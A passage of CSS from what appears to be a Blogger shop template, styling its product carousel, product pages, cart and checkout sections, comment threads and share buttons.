    background: -ms-linear-gradient(top,rgba(0,0,0,0.2) 50%,rgba(0,0,0,0.5) 70%,rgba(0,0,0,1) 100%);
    background: -o-linear-gradient(top,rgba(0,0,0,0.2) 50%,rgba(0,0,0,0.5) 70%,rgba(0,0,0,1) 100%);
    background: linear-gradient(top,rgba(0,0,0,0.2) 50%,rgba(0,0,0,0.5) 70%,rgba(0,0,0,1) 100%);
transition: all 0.25s ease-in-out 0s;
}
.ty-slide:hover .tyimg-lay {
    opacity: .75;
}

.ty-slide .recent-shop {
    transition: all .3s;
    background: $maincolor;
    padding: 5px 12px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 12px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: normal;
    white-space: nowrap;
    font-family: 'Righteous', cursive;
}
.ty-slide .recent-shop i {
margin-right:5px;
}
.owl-carousel,.owl-carousel .owl-item{-webkit-tap-highlight-color:transparent;position:relative}.owl-carousel{display:none;width:100%;z-index:1}.owl-carousel .owl-stage{position:relative;-ms-touch-action:pan-Y;-moz-backface-visibility:hidden}.owl-carousel .owl-stage:after{content:".";display:block;clear:both;visibility:hidden;line-height:0;height:0}.owl-carousel .owl-stage-outer{position:relative;overflow:hidden;-webkit-transform:translate3d(0,0,0)}.owl-carousel .owl-item,.owl-carousel .owl-wrapper{-webkit-backface-visibility:hidden;-moz-backface-visibility:hidden;-ms-backface-visibility:hidden;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0)}.owl-carousel .owl-item{min-height:1px;float:left;-webkit-backface-visibility:hidden;-webkit-touch-callout:none}.owl-carousel .owl-item img{display:block;width:100%}.owl-carousel .owl-dots.disabled,.owl-carousel .owl-nav.disabled{display:none}.no-js .owl-carousel,.owl-carousel.owl-loaded{display:block}.owl-carousel .owl-dot,.owl-carousel .owl-nav .owl-next,.owl-carousel .owl-nav .owl-prev{cursor:pointer;cursor:hand;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.owl-carousel.owl-loading{opacity:0;display:block}.owl-carousel.owl-hidden{opacity:0}.owl-carousel.owl-refresh .owl-item{visibility:hidden}.owl-carousel.owl-drag .owl-item{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.owl-carousel.owl-grab{cursor:move;cursor:grab}.owl-carousel.owl-rtl{direction:rtl}.owl-carousel.owl-rtl .owl-item{float:right}.owl-carousel .animated{animation-duration:1s;animation-fill-mode:both}.owl-carousel .owl-animated-in{z-index:0}.owl-carousel .owl-animated-out{z-index:1}.owl-carousel .fadeOut{animation-name:fadeOut}@keyframes fadeOut{0%{opacity:1}100%{opacity:0}}.owl-height{transition:height .5s ease-in-out}.owl-carousel .owl-item .owl-lazy{opacity:0;transition:opacity .4s ease}.owl-carousel .owl-item img.owl-lazy{transform-style:preserve-3d}.owl-carousel .owl-video-wrapper{position:relative;height:100%;background:#000}.owl-carousel .owl-video-play-icon{position:absolute;height:80px;width:80px;left:50%;top:50%;margin-left:-40px;margin-top:-40px;background:url(owl.video.play.png) no-repeat;cursor:pointer;z-index:1;-webkit-backface-visibility:hidden;transition:transform .1s ease}.owl-carousel .owl-video-play-icon:hover{-ms-transform:scale(1.3,1.3);transform:scale(1.3,1.3)}.owl-carousel .owl-video-playing .owl-video-play-icon,.owl-carousel .owl-video-playing .owl-video-tn{display:none}.owl-carousel .owl-video-tn{opacity:0;height:100%;background-position:center center;background-repeat:no-repeat;background-size:contain;transition:opacity .4s ease}.owl-carousel .owl-video-frame{position:relative;z-index:1;height:100%;width:100%}

.owl-theme .owl-dots,.owl-theme .owl-nav{text-align:center;-webkit-tap-highlight-color:transparent}.owl-theme .owl-nav{margin-top:10px}.owl-theme .owl-nav [class*=owl-]{color:#FFF;font-size:14px;margin:5px;padding:4px 7px;background:#D6D6D6;display:inline-block;cursor:pointer;border-radius:3px}.owl-theme .owl-nav [class*=owl-]:hover{background:#869791;color:#FFF;text-decoration:none}.owl-theme .owl-nav .disabled{opacity:.5;cursor:default}.owl-theme .owl-nav.disabled+.owl-dots{margin-top:10px}.owl-theme .owl-dots .owl-dot{display:inline-block;zoom:1}.owl-theme .owl-dots .owl-dot span{width:10px;height:10px;margin:5px 7px;background:#D6D6D6;display:block;-webkit-backface-visibility:visible;transition:opacity .2s ease;border-radius:30px}.owl-theme .owl-dots .owl-dot.active span,.owl-theme .owl-dots .owl-dot:hover span{background:#869791}
.owl-prev, .owl-next {
    top: 0;
    color: #fff;
    font-family: FontAwesome;
    position: absolute;
background:$maincolor;
    z-index: 1;
    display: block;
    cursor: pointer;
        padding: 10px;
    text-align: center;
    overflow: hidden;
transition: all .2s linear;
-moz-transition: all .2s linear;
-webkit-transition: all .2s linear;
-o-transition: all .2s linear;
}
.owl-prev:before {
    content: '\f060';
    font-family: fontawesome;
}
.owl-next:before {
    content: '\f061';
    font-family: fontawesome;
}
.owl-next {
    right: -100px;
}
.owl-prev {
    left: -100px;
}
.ty-slide:hover .owl-prev {
left:0;
}
.ty-slide:hover .owl-next {
right:0;
}
/* ######## Responsive Ads ######################### */
.res-pro-ad {
    margin: 15px auto 15px;
}
/* ######## Section 2 Css ######################### */
.special-wrap {
margin:0 auto;
overflow:hidden;
}
.special-tiles {
width: 25%;
float: left;
box-sizing: border-box;
text-align: center;
    padding: 0 10px;
}

.special-tiles-wrap {
box-sizing: border-box;
background:#eaeaea;
border:1px solid #dddddd;
cursor:pointer;
  transition: all 0.3s ease-out 0s;
    -webkit-transition: all 0.4s ease-in-out 0s;
}
.special-tiles-wrap:hover {
    background: #222;
    border-color: #333;
    color: #fff;
}
.special-tiles-wrap:hover .special-heading, .special-tiles-wrap:hover .special-text {
color:#fff;
}
.special-tiles:first-child {
padding:0 10px 0 0;
}
.special-tiles:last-child {
padding:0 0 0 10px;
}
.special-icons {
font-size: 45px;
width: 150px;
    height: 150px;
    background-color: #f0f0f0;
    border-radius: 50%;
    position: relative;
    display: inline-block;
    overflow: hidden;
    margin: 10px;
    list-style: none;
line-height:150px;
  transition: all 0.3s ease-out 0s;
    -webkit-transition: all 0.4s ease-in-out 0s;
}
.special-tiles-wrap:hover .special-icons {
background:$maincolor;
color:#ffffff;
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
    transition: all 0.3s ease-out 0s;
    -webkit-transition: all 0.4s ease-in-out 0s;
}
.special-heading {
font-size: 14px;
line-height: 21px;
color: #444;
text-transform: uppercase;
letter-spacing: 1.5px;
margin-bottom: 10px;
font-weight:bold;
    padding: 0 8px;
  transition: all 0.3s ease-out 0s;
    -webkit-transition: all 0.4s ease-in-out 0s;
}
.special-text {
margin: 0 0 20px;
color: #666;
    padding: 0 8px;
  transition: all 0.3s ease-out 0s;
    -webkit-transition: all 0.4s ease-in-out 0s;
}
/* ######## Sidebar Css ######################### */
.sidebar .widget {
margin-bottom: 20px;
position: relative;
}
.sidebar h2 {
position: relative;
    overflow: hidden;
    margin: 0;
    font-size: 18px;
    vertical-align: middle;
    padding:10px;
    border-left: 4px solid $maincolor;
    font-weight: 700;
background:#f0f0f0;
color:#222;
}

.sidebar ul,.sidebar li{
list-style-type:none;
margin:0;
padding:0;
}
.sidebar .widget-content {
    padding: 10px 0;
}
/* ######## Post Css ######################### */
#main-wrapper .custom-title {
background: #f0f0f0;
    padding: 10px 12px;
    display: block;
    vertical-align: middle;
    margin: 0 0 10px;
    font-size: 16px;
    border-left: 3px solid $maincolor;
    white-space: nowrap;
    text-transform: uppercase;
    letter-spacing: 1px;
position: relative;
    overflow: hidden;
}
#main-wrapper .custom-title h2 {
    font-family: 'Righteous', cursive;
    font-weight: normal;
    color: #444;
}
#main-wrapper .custom-title h2:after {
    content: '';
    display: inline-block;
    position: absolute;
    height: 15px;
    top: 0;
    margin: 3px 0 12px 10px;
    width: 100%;
    background: url(http://4.bp.blogspot.com/-R2WTW6O9E1o/VX7dqIGT1eI/AAAAAAAACc4/pyvQDMMLX3E/s1600/repeat-bg.png)repeat;
}
article {
padding: 0;
}
.index .post-grid-item, .archive .post-grid-item {
width:23.8%;
float:left;
margin-right:15px;
margin-bottom:15px;
}
.index .post-grid-item:nth-child(4n) {
margin-right:0;
}
.sora_product_item_dis {
    top: 5px;
    position: absolute;
    left: 5px;
    z-index: 9;
    width: 50px;
    height: 50px;
    background: $maincolor;
    padding: 0;
    margin: 0;
    text-align: center;
    line-height: 50px;
    border-radius: 100%;
    letter-spacing: 1px;
    color: #fff;
    font-size: 16px;
    font-family: 'Righteous', cursive;
}
.post {
display: block;
word-wrap: break-word;
background: #ffffff;
}
.index .post h2, .archive .post h2 {
font-size: 20px;
    line-height: 20px;
    margin: 0;
    font-weight: 700;
    padding: 18px 0 10px;
    text-transform: capitalize;
}
.index .post h2 a, .archive .post h2 a {
color: #000;
letter-spacing: 1px;
}
.index .post h2, .archive .post h2 {
    margin: 10px 0 10px;
    padding: 0;
}

.item #main-wrapper .post-custom-title .custom-title {
    line-height: 20px;
    background: $maincolor;
    color: #fff;
    margin-bottom: 0;
    text-align: center;
}
.item #main-wrapper .post-custom-title .custom-title h2 {
color:#fff;
}
.item #main-wrapper .post-custom-title .custom-title h2:after {
   display:none;
}
.item #main-wrapper .custom-title h4 {
font-family: 'Righteous', cursive;
    font-weight: normal;
    color: #444;
}
.item #main-wrapper .custom-title h4:after {
    content: '';
    display: inline-block;
    position: absolute;
    height: 15px;
    top: 0;
    margin: 3px 0 12px 10px;
    width: 100%;
    background: url(http://4.bp.blogspot.com/-R2WTW6O9E1o/VX7dqIGT1eI/AAAAAAAACc4/pyvQDMMLX3E/s1600/repeat-bg.png)repeat;
}
.item #main-wrapper .related-product .custom-title {
    margin: 10px 0;
}
.retitle h2 {
    margin: 8px 0;
    display: block;
}
.sora-product-detail {
    padding: 0;
    box-sizing: border-box;
margin-bottom:10px;
display: flex;
  flex-wrap: wrap;
}
.sora-product-detail .sora-product-image {
    float: left;
    background: none;
    height: auto;
    margin-right: 10px;
    width: 35%;
background-color: #f0f0f0;
    border: 1px solid #eee;
    padding: 10px;
    position: relative;
}
.sora-product-detail .sora-product-image .sora_product_item_dis {
top:15px;
left:15px;
}
.sora-product-detail .sora-product-image img {
height:320px;
    width: 100%;
}
.sora-product-detail .sora-pro-info {
width: 60%;
    float: left;
}
.sora-product-detail .sora-pro-info .post-head {
    border-bottom: 1px solid #eee;
    margin: 10px 0;
}
.sora-product-detail .sora-pro-info .post-head h1 { 
    font-size: 25px;
    line-height: 25px;
    font-weight: 700;
    margin: 0;
    padding-bottom: 5px;
    text-transform: capitalize;
    letter-spacing: 1px;
    display: inline-block;
    border-bottom: 1px solid #2c3e50;
    position: relative;
    top: 2px;
}
.sora-product-detail .sora-pro-info .sora-product-buy-box {
    background: #f0f0f0;
    border: 1px solid #eeeeee;
    text-align: center;
    padding: 10px;
}
.sora-product-detail .sora-pro-info .sora-product-buy-box .sora_product_item_price {
background: #fff;
    text-align: center;
    font-weight: 400;
    padding: 10px;
}
.sora-product-detail .sora-pro-info .sora-product-buy-box .sora_product_item_price .sora-product-price-text, .sora-product-detail .sora-pro-info .sora-product-buy-box  .sora_product_item_price .sora_product_price {
font-size:22px;
}
.sora-product-detail .sora-pro-info .sora-product-buy-box .sora-product-buy-buttons .item_add,
.sora-product-detail .sora-pro-info .sora-product-buy-box .sora-product-buy-buttons .sora-cart-view,
.sora-product-detail .sora-pro-info .sora-product-buy-box .sora-product-buy-buttons .sora-cart-payment {
transition: all .3s;
    background: $maincolor;
    padding: 5px 12px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 12px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: bold;
    white-space: nowrap;
}
.sora-product-detail .sora-pro-info .sora-product-buy-box .sora-product-buy-buttons .item_add i, .sora-product-detail .sora-pro-info .sora-product-buy-box .sora-product-buy-buttons .sora-cart-view i, .sora-product-detail .sora-pro-info .sora-product-buy-box .sora-product-buy-buttons .sora-cart-payment i {
margin-right:5px;
}
.sora-product-detail .sora-pro-info .sora-product-short-desc {
margin: 10px 0 0;
    display: block;
    text-align: left;
}
.sora-product-detail .sora-pro-info .sora-product-short-desc b {
text-transform:Uppercase;
margin-bottom:5px;
display:block;
}
.static_page .post-head {
    text-align: center;
}
.post-body {
background-color: #f0f0f0;
    border: 1px solid #eee;
margin: 0px;
padding:10px;
font-size: 14px;
line-height: 26px;
box-sizing:border-box;
}
.post-home-image {
float: none;
    margin: 0 auto;
    clear: both;
    width: 100%;
position:relative;
}
.post-home-image .post-thumb {
width: 100%;
height: auto;
position: relative;
display: block;
overflow: hidden;
background: #e5e5e5;
}
.post-home-image .post-thumb:before {
background: rgba(0, 0, 0, 0.3);
bottom: 0px;
content: "";
height: 100%;
width: 100%;
left: 0px;
right: 0px;
margin: 0px auto;
position: absolute;
z-index: 3;
opacity:0;
}
.post-home-image .post-thumb img {
width: 100%;
height: 320px;
display: block;
object-fit:cover;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.post-product-header {
    color: #bdbdbd;
    display: block;
    font-size: 12px;
    font-weight: 400;
    line-height: 1.3em;
    margin: 0!important;
    padding: 0;
}
.post-product-header a {
    color: #bdbdbd;
}
.post-home-product {
    text-align: center;
}
.product-quick-view {
    animation-duration: 0.3s;
  transition: all .3s;
    background: $maincolor;
    padding: 7px 12px !important;
    display: block;
    margin: 0;
    font-size: 15px;
    text-transform: uppercase;
    color: #f7f7f7;
    position: absolute;
    bottom: 25%;
    width: 100%;
    box-sizing: border-box;
    text-align: center;
    font-weight: bold;
    font-family: Raleway;
opacity:0;
}
.post-home-image:hover .product-quick-view {
bottom:0;
opacity:1;
}
.post-home-image:hover .post-thumbnail {
opacity: 0.3;
    transform: scale(1.3);
    -webkit-transform: scale(1.3);
    transition: all 0.5s ease 0s;
    -webkit-transition: all 0.5s ease 0s;
}

.sora_product_item_price .sora-product-price-text, .sora_product_item_price .sora_product_price {
font-size: 14px;
    font-weight: bold;
    letter-spacing: 1px;
    color: #333;
}
.sora_product_item_price .sora-product-price-text {
    color: $maincolor;
    padding: 0 5px 0 0;
}
.post-product-header .item_add {
        transition: all .3s;
    background: $maincolor;
    padding: 8px 16px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 15px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: normal;
    white-space: nowrap;
    font-family: 'Righteous', cursive;
}
.post-product-header .item_add i {
margin-right:5px;
}
.post-header {
    padding: 10px;
}
#meta-post .fa-calendar-o {
    margin-left: 8px;
}
.post-meta {
    color: #bdbdbd;
    display: block;
    font-size: 13px;
    font-weight: 400;
    line-height: 21px;
    margin: 0;
    padding: 0;
}
.post-meta a, .post-meta i {
    color: #CBCBCB;
}
.post-timestamp {
    margin-left: 5px;
}
.label-head {
    margin-left: 5px;
}
.label-head a {
    padding-left: 2px;
}
.resumo {
    margin-top: 10px;
    color: #919191;
}
.resumo span {
    display: block;
    margin-bottom: 8px;
font-size: 16px;
    line-height: 31px;
}
.post-body img {
max-width: 100%;
padding: 10px 0;
position: relative;
margin:0 auto;
}
.post h3 {
font-size: 18px;
margin-top: 20px;
margin-bottom: 10px;
line-height: 1.1;
}
.second-meta {
    display: none;
}
.comment-link {
    white-space: normal;
}
.item #blog-pager {
display:none;
}
#blog-pager {
clear: both;
text-align: center;
padding: 15px 0;
background: #ffffff;
color: #4d4d4d;
}
.displaypageNum a,
.showpage a,
.pagecurrent, .blog-pager-older-link, .blog-pager-newer-link {
padding: 5px 13px;
margin-right: 8px;
color: #fff;
background-color: #36404b;
display: inline-block;
line-height: 20px;
-moz-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
margin-top: 10px;
}
.displaypageNum a:hover,
.showpage a:hover,
.pagecurrent, .blog-pager-older-link:hover, .blog-pager-newer-link:hover {
background: #fb4848;
text-decoration: none;
color: #fff;
}
.showpageOf {
display: none!important;
overflow: hidden;
}
#blog-pager .pages {
margin: 10px 0;
border: none;
}
.comments {
    clear: both;
    margin-top: 0;
    margin-bottom: 0;
    color: #2A3744
}
.comment-form h4 {
    font-size: 13px;
    text-transform: uppercase;
    font-weight: 700;
    padding: 10px 0;
    margin: 0;
    border-bottom: 1px solid #eee
}
.cmm-title {
    position: relative
}
.cmm-title span {
    position: absolute;
    left: 0;
    bottom: 0px;
    display: block;
    width: 30px;
    height: 3px;
    background-color: #FFFF00
}
.comments .comments-content {
    padding: 10px 0
}
.comments .comments-content .comment {
    margin-bottom: 0;
    padding-bottom: 8px
}
.comments .comments-content .comment:first-child {
    padding-top: 0
}
.cmm-tabs .content-tab {
    background-color: transparent;
    padding: 0
}
.cmm-tabs-header {
    background-color: #2A3744;
    height: 32px;
    margin-bottom: 0;
    position: relative
}
.cmm-tabs-header h3 {
    display: inline-block;
    margin: 0;
    color: #fff;
    font-weight: 700;
    text-transform: uppercase;
    font-size: 13px;
    height: 32px;
    line-height: 32px;
    padding-left: 10px
}
.cmm-tabs-header h3 h9 {
    display: none
}
.simpleTab .cmm-tabs-header .wrap-tab {
    float: right
}
.cmm-tabs-header .wrap-tab a {
    height: auto;
    line-height: 32px;
    padding: 0 10px;
    font-size: 14px;
    display: inline-block
}
.cmm-tabs-header .wrap-tab li {
    float: left;
    width: auto
}
.facebook-tab,
.fb_iframe_widget_fluid span,
.fb_iframe_widget iframe {
    width: 100%!important
}
.comments .item-control {
    position: static
}
.comments .avatar-image-container {
    float: left
}
.comments .avatar-image-container,
.comments .avatar-image-container img {
    height: 35px;
    max-height: 35px;
    width: 35px;
    max-width: 35px;
    border-radius: 100%
}
.comments .comment-block {
    padding: 10px;
    box-shadow: none;
    border: 1px solid #eee;
    border-radius: 2px
}
.comments .comment-block,
.comments .comments-content .comment-replies {
    margin-left: 47px;
    margin-top: 0
}
.comments .comments-content .inline-thread {
    padding: 0
}
.comments .comments-content .comment-header {
    font-size: 14px;
    border-bottom: 1px solid #eee;
    padding: 0 0 3px
}
.comments .comments-content .user {
    font-style: normal;
    font-weight: 400
}
.comments .comments-content .icon.blog-author {
    font-weight: 400
}
.comments .comments-content .comment-content {
    text-align: justify;
    font-size: 14px;
    line-height: 1.4em
}
.comments .comment .comment-actions a {
    margin-right: 5px;
    padding: 2px 5px;
    color: #2A3744;
    font-weight: 400;
    background-color: #eee;
    font-size: 10px;
    letter-spacing: 1px;
    border-radius: 2px
}
.comments .comment .comment-actions a:hover {
    background-color: #FFFF00;
    color: #fff;
    text-decoration: none
}
.comments .comments-content .datetime {
    margin-left: 0;
    float: right;
    font-size: 11px
}
.comments .comments-content .comment-header a {
    color: inherit
}
.comments .comments-content .comment-header a:hover {
    color: #FFFF00
}
.comments .comments-content .icon.blog-author {
   height: auto;
    width: auto;
    background: $maincolor;
    padding: 0 5px;
    border-radius: 3px;
    color: #fff;
    text-transform: uppercase;
    font-family: 'Righteous', cursive;
    letter-spacing: 1px;
}
.comments .comments-content .icon.blog-author:before {
    content: "Seller";
    font-size: 12px;
}
.comments .thread-toggle {
    margin-bottom: 4px
}
.comments .comments-content .comment-thread {
    margin: 4px 0
}
.comments .continue a {
    padding: 0;
    padding-top: 10px;
    padding-left: 47px;
    font-weight: 500
}
.comments .comments-content .loadmore.loaded {
    margin: 0;
    padding: 0
}
.comments .comment-replybox-thread {
    margin: 0
}
iframe.blogger-iframe-colorize,
iframe.blogger-comment-from-post {
    max-height: 283px!important
}
.sora-cart-review {
    border: 1px solid #f0f0f0;
    -webkit-box-shadow: 0px 3px 3px 0px rgba(0,0,0,0.05);
    -moz-box-shadow: 0px 3px 3px 0px rgba(0,0,0,0.05);
    box-shadow: 0px 3px 3px 0px rgba(0,0,0,0.05);
}
.sora-cart-review-wrap {
    padding: 10px;
    box-sizing: border-box;
    display: flex;
    flex-wrap: wrap;
}
.sora-cart-review-wrap .itemRow {
       display: block;
    margin-bottom: 15px;
    overflow: hidden;
    border: 1px solid #eee;
    background-color: #f0f0f0;
    color: #111;
    padding: 10px;
    position: relative;
}
.sora-cart-review-wrap .item-thumb {
    float: left;
    width: 70px;
    margin-right: 10px;
}
.sora-cart-review-wrap .item-thumb img {
    width: 100%;
    vertical-align: middle;
    object-fit: cover;
}
.sora-cart-review-wrap .item-name {
display: block;
font-size: 18px;
font-weight: 600;
line-height: 1.25;
margin-bottom: 10px;
margin-right: 12px;
text-transform: capitalize;
width: auto;
font-family: Raleway;
}
.sora-cart-review-wrap .item-price {
font-size: 14px;
line-height: 1.25;
margin-bottom: 10px;
}
.sora-cart-review-wrap .item-decrement, .sora-cart-review-wrap .item-increment {
width: 15px;
float: left;
text-align: center;
}
.sora-cart-review-wrap .item-decrement, .sora-cart-review-wrap .item-quantity {
float: left;
margin-right: 5px;
font-size: 16px;
}
.sora-cart-review-wrap .item-decrement a, .sora-cart-review-wrap .item-increment a {
text-decoration: none;
padding: 1px 4px;
height: 20px;
font-size: 16px;
text-align: center;
color: $maincolor;
display: inline-block;
}
.sora-cart-review-wrap .item-quantity {
margin: 0px 10px 0px 5px;
}
.sora-cart-review-wrap .item-total {
margin: 10px 0;
font-size: 16px;
}
.sora-cart-review-wrap .item-increment {
margin-right: 5px;
}
.sora-cart-review-wrap .item-remove {
position: absolute;
right: 10px;
top: 10px;
color: $maincolor;
line-height: 16px;
}
.sora-cart-review-wrap .item-remove a {
color: $maincolor;
font-size:16px;
}
.sora-cart-review-wrap .simpleCart_items {
    display: block;
    width: 100%;
    box-sizing: border-box;
}
.sora-cart-review-wrap .cart-bot-element {
    display: block;
    width: 100%;
    box-sizing: border-box;
  margin: 10px 0 0;
}
.sora-cart-review-wrap .sora-cart-ammount {
    float: left;
    font-size: 16px;
    text-transform: uppercase;
}
.sora-cart-review-wrap .sora-cart-subtotal {
    font-family: 'Righteous', cursive;
    letter-spacing: 0.8px;
    margin-right: 10px;
}
.sora-cart-review-wrap .simpleCart_total {
    color: $maincolor;
    font-weight: bold;
}
.sora-cart-review-wrap .simpleCart_checkout {
 transition: all .3s;
    background: $maincolor;
    padding: 5px 12px !important;
    display: inline-block;
    vertical-align: middle;
    margin:0;
    font-size: 12px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: bold;
    white-space: nowrap;
float:right;
}
.sora-cart-review-wrap .simpleCart_checkout:before {
    content: '\f07a';
    font-family: FontAwesome;
    margin-right: 5px;
}
.sora-cart-checkout {
    border: 1px solid #f0f0f0;
    -webkit-box-shadow: 0px 3px 3px 0px rgba(0,0,0,0.05);
    -moz-box-shadow: 0px 3px 3px 0px rgba(0,0,0,0.05);
    box-shadow: 0px 3px 3px 0px rgba(0,0,0,0.05);
}
.sora-cart-checkout-wrap {
    padding: 10px;
    box-sizing: border-box;
  overflow:hidden;
}
.sora-checkout-wrap {
display: block;
    width: 100%;
    box-sizing: border-box;
}
.sora-cart-checkout-wrap #contact .contact-form-name {
    margin-right: 25px;
}
.sora-checkout-details {
    text-align: center;
    font-family: Raleway;
    text-transform: capitalize;
    font-weight: bold;
    font-size: 14px;
    letter-spacing: 0.8px;
}
.sora-checkout-wrap .itemRow {
       display: block;
    margin-bottom: 15px;
    overflow: hidden;
    border: 1px solid #eee;
    background-color: #f0f0f0;
    color: #111;
    padding: 10px;
    position: relative;
}
.sora-checkout-wrap .item-thumb {
    float: left;
    width: 70px;
    margin-right: 10px;
}
.sora-checkout-wrap .item-thumb img {
    width: 100%;
    vertical-align: middle;
    object-fit: cover;
}
.sora-checkout-wrap .item-name {
display: block;
font-size: 18px;
font-weight: 600;
line-height: 1.25;
margin-bottom: 10px;
margin-right: 12px;
text-transform: capitalize;
width: auto;
font-family: Raleway;
}
.sora-checkout-wrap .item-price {
font-size: 14px;
line-height: 1.25;
margin-bottom: 10px;
}
.sora-checkout-wrap .item-decrement, .sora-checkout-wrap .item-increment {
width: 15px;
float: left;
text-align: center;
}
.sora-checkout-wrap .item-decrement, .sora-checkout-wrap .item-quantity {
float: left;
margin-right: 5px;
font-size: 16px;
}
.sora-checkout-wrap .item-decrement a, .sora-checkout-wrap .item-increment a {
text-decoration: none;
padding: 1px 4px;
height: 20px;
font-size: 16px;
text-align: center;
color: $maincolor;
display: inline-block;
}
.sora-checkout-wrap .item-quantity {
margin: 0px 10px 0px 5px;
}
.sora-checkout-wrap .item-total {
margin: 10px 0;
font-size: 16px;
}
.sora-checkout-wrap .item-increment {
margin-right: 5px;
}
.sora-checkout-wrap .item-remove {
position: absolute;
right: 10px;
top: 10px;
color: $maincolor;
line-height: 16px;
}
.sora-checkout-wrap .item-remove a {
color: $maincolor;
font-size:16px;
}
.sora-checkout-wrap .simpleCart_items {
    display: block;
    width: 100%;
    box-sizing: border-box;
}
.sora-checkout-wrap .cart-bot-element {
    display: block;
    width: 100%;
    box-sizing: border-box;
  margin: 10px 0 0;
}
.sora-checkout-wrap .sora-cart-ammount {
    float: right;
    font-size: 16px;
    text-transform: uppercase;
    margin-bottom: 5px;
}
.sora-checkout-wrap .sora-cart-subtotal {
    font-family: 'Righteous', cursive;
    letter-spacing: 0.8px;
    margin-right: 10px;
}
.sora-checkout-wrap .simpleCart_total {
    color: $maincolor;
    font-weight: bold;
}
.sora-checkout-wrap .simpleCart_checkout {
 transition: all .3s;
    background: $maincolor;
    padding: 5px 12px !important;
    display: inline-block;
    vertical-align: middle;
    margin:0;
    font-size: 12px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: bold;
    white-space: nowrap;
float:right;
}
.sora-checkout-wrap .simpleCart_checkout:before {
    content: '\f07a';
    font-family: FontAwesome;
    margin-right: 5px;
}
.sora-checkout-wrap .simpleCart_checkout .sora-checkout-bill {
 float: right;
    border: 0px;
    background: none;
    padding: 0;
    color: #fff;
    font-size: 16px;
}
   
/* ######## Share widget Css ######################### */
.share-box {
position: relative;
padding: 10px 0;
text-align: center;
}
.sora-product-review {
border-bottom: 2px solid #eee;
color: #010101;
display: inline-block;
padding-bottom: 7px;
font-size: 15px;
font-weight: 500;
clear: both;
margin: 0 0 10px;
position: relative;
float: left;
}
.share-title:after {
position: absolute;
left: 50%;
margin-left: -5px;
bottom: -5px;
content: "";
display: block;
width: 0;
height: 0;
border-left: 5px solid transparent;
border-right: 5px solid transparent;
border-top: 5px solid #eee;
}
.share-art {
float: right;
padding: 0;
padding-top: 0;
font-size: 13px;
font-weight: 400;
text-transform: capitalize;
}
.share-art a {
color: #fff;
padding: 3px 8px;
margin-left: 4px;
border-radius: 2px;
display: inline-block;
margin-right: 0;
background: #010101;
}
.share-art i {
color:#fff;
}
.share-art a:hover{color:#fff}
.share-art .fac-art{background:#3b5998}
.share-art .fac-art:hover{background:rgba(49,77,145,0.7)}
.share-art .twi-art{background:#00acee}
.share-art .twi-art:hover{background:rgba(7,190,237,0.7)}
.share-art .goo-art{background:#db4a39}
.share-art .goo-art:hover{background:rgba(221,75,56,0.7)}
.share-art .pin-art{background:#CA2127}
.share-art .pin-art:hover{background:rgba(202,33,39,0.7)}
.share-art .lin-art{background:#0077B5}
.share-art .lin-art:hover{background:rgba(0,119,181,0.7)}
#related-posts {
margin-bottom: 10px;
padding: 10px 0;
}
.related li {
width: 33.3%;
    display: inline-block;
    height: auto;
    min-height: 184px;
    float: left;
    box-sizing: border-box;
    padding: 0 5px;
    overflow: hidden;
    position: relative;
}
.related li:first-child {
padding: 0 5px 0 0;
 
}
.related li:last-child {
   padding: 0 0 0 5px;
}
.related li h3 {
margin-top:0;
}
.related-thumb {
width: 100%;
height: 280px;
overflow: hidden;
background-color: #f0f0f0;
    border: 1px solid #eee;
}
.related li .related-img {
width: 100%;
height: 280px;
display: block;
position: relative;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.related li .related-img:hover {
-webkit-transform: scale(1.1) rotate(-1.5deg)!important;
-moz-transform: scale(1.1) rotate(-1.5deg)!important;
transform: scale(1.1) rotate(-1.5deg)!important;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.related-title {
margin: 10px 0;
    display: block;
    padding: 0;
}
.related-title a {
font-size: 20px;
    line-height: 20px;
    font-weight: 700;
    padding: 0;
    text-transform: capitalize;
    color: #222;
    font-family: Raleway;
}
.related .related-tag {
display:none;
}
.related-overlay {
position: absolute;
left: 0;
top: 0;
z-index: 1;
width: 100%;
height: 100%;
background-color: rgba(40,35,40,0.05);
}
.related-content {
display: block;
bottom: 0;
padding: 10px 0px 11px;
width: 100%;
line-height: 1.2em;
box-sizing: border-box;
z-index: 2;
text-align:center;
}
.related-content .rel-read {
    transition: all .3s;
    background: $maincolor;
    padding: 8px 16px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 15px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: normal;
    white-space: nowrap;
    font-family: 'Righteous', cursive;
}
.related-content .rel-read i {
    margin-right: 5px;
}
.related-product .custom-title {
    background: #f0f0f0;
    padding: 10px 12px;
    display: block;
    vertical-align: middle;
    margin: 0 0 10px;
    font-size: 16px;
    border-left: 3px solid $maincolor;
    white-space: nowrap;
    text-transform: uppercase;
    letter-spacing: 1px;
    position: relative;
    overflow: hidden;
    line-height: 20px;
}
.related-product .custom-title h2 {
    font-family: 'Righteous', cursive;
    font-weight: normal;
    color: #444;
}
.related-product .custom-title h2:after {
    content: '';
    display: inline-block;
    position: absolute;
    height: 15px;
    top: 0;
    margin: 3px 0 12px 10px;
    width: 100%;
